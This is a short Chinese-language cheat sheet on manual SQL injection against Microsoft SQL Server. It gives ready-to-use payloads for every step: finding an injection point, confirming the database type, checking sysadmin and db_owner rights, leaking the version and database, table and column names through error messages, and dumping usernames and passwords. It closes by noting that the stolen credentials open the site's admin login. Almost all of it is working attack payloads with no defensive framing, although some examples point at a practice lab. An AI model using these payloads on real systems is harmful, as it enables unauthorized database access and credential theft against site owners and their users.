#mssql手工注入


----------
+ 检测注入点
```mssql
?id=1' and 1=1-- # --表示闭合sql语句（一般可以测试.net 网站）
?id=1' and 1=2--
```
----------

+ 判断数据库类型
```mssql
?id=1' union select * from users where id=1 and exists(select * from sysobjects)--
and (select count(*) from sysobjects)>0  返回正常说明是mssql数据库
```
1433端口一般为mssql数据库开放端口

----------
- 注入点权限的判断（根据页面显示效果）
```mssql
?id=1' and (select IS_SRVROLEMEMBER('sysadmin'))>0--  判断是否为sa权限 页面正常显示便为sa权限
?id=1' and (select IS_SRVROLEMEMBER('public'))>0--  有返回结果说明当前用户为public权限 一般来说有这个权限也看见可以进行暴库 爆表 爆字段了
```

- 判断当前用户的文件读写权限
```mssql
http://……/less-1.asp?id=1' and (select IS_SRVROLEMEMBER('db_owner'))>0-- 没有返回结果便说明没有文件的读写权限
```

----------
- 获取该网站信息（通过.net的报错机制，通过报错爆出数据信息）
```mssql
and 1=(select @@version) 查看版本信息
and 1=(select db_name()) 获取当前数据库
and User_Name()>0  获取当前用户名
```

----------
- 爆库名
```mssql
and 1=(select name from master.dbo.sysdatabases where dbid=1)   暴库名DBID为1，2，3....
暴库名后面依次类推......
```

----------
- 爆表名
```mssql
and (select top 1 name from [数据库名字].sys.all_objects where type='U' AND is_ms_shipped=0)>0  指定数据库爆表
and (select top 1 name from test.sys.all_objects where type='U' and is_ms_shipped=0)=1 获取第一个表名
and (select top 1 name from test.sys.all_objects where type='U' and is_ms_shipped=0 and name not in ('emails'))=1  获取第二个表
```
后面依次类推.......

----------
- 爆字段
```mssql
and (select top 1 column_name from test.information_schema.columns where table_name='users')=1  指定users表 获取第一个字段

and (select top 1 column_name from test.information_schema.columns where table_name='users' and column_name not in ('id'))=1   指定users表 获取第二个字段

后面依次类推.......
```

----------
- 获取字段数据
```mssql
and (select top 1 username from users)=1 获取username的内容
and (select top 1 password from users)=1  获取password的内容
得到账号密码后 在后台登录地址登录就ok了
```


